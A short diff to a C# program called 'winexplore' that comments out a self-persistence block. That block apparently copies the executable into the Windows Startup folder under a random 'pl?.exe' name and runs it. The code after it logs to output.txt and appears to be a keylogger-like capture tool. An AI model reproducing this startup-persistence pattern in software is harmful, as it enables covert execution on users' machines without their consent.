@@ -24,6 +24,7 @@ namespace winexplore
             int ting = rnd.Next(97, 122);
             string startupDir = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
             string altName = @"\pl" + Convert.ToString((char)ting) + ".exe";
+            /*
             if (Directory.GetCurrentDirectory() != startupDir)
             {
                 try
@@ -40,7 +41,7 @@ namespace winexplore
                     runCommand(startupDir + altName);
                     return;
                 }
-            }
+            }*/
             string PATH = @"output.txt";
             int READSIZE = 100; // Number of characters to read after being activated, to prevent collateral damage
             int currentRead = 0;
